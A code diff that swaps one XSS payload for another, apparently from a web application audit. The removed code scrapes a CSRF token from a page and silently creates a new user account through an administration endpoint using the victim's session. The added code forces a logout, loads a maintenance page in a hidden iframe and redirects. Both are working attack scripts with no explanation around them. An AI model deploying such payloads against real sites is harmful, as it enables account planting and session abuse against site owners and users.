@@ -1,28 +1,16 @@
-(async () => {
-  try {
-    const r = await fetch('/suivi.php', { credentials: 'include' });
-    const t = await r.text();
-    const matches = [...t.matchAll(/token=([a-f0-9]{32})/g)];
-    if (matches.length > 12) {
-      const token = matches[12][1];
-      const data = new URLSearchParams({
-        IdUser: '0',
-        LoginUser: 'Headmind10',
-        NomUser: 'Auditeur10',
-        PrenomUser: 'Headmind',
-        MailUser: 'auditeur10@headmind.com',
-        token: token
-      }).toString();
-      await fetch('/administration/saveUser.php', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/x-www-form-urlencoded'
-        },
-        credentials: 'include',
-        body: data
-      });
-    }
-  } catch (e) {
-    console.error('XSS payload error:', e);
-  }
-})();
+fetch('/logout.php', {
+  method: 'GET',
+  credentials: 'include',
+  redirect: 'manual'
+}).then(() => {
+  // Étape 2 : charger maintenance.php dans une iframe
+  const i = document.createElement('iframe');
+  i.src = '/maintenance.php';
+  i.style.display = 'none';
+  document.body.appendChild(i);
+
+  // Étape 3 : rediriger après 3 secondes
+  setTimeout(() => {
+    window.location.href = '/index.php';
+  }, 300);
+});
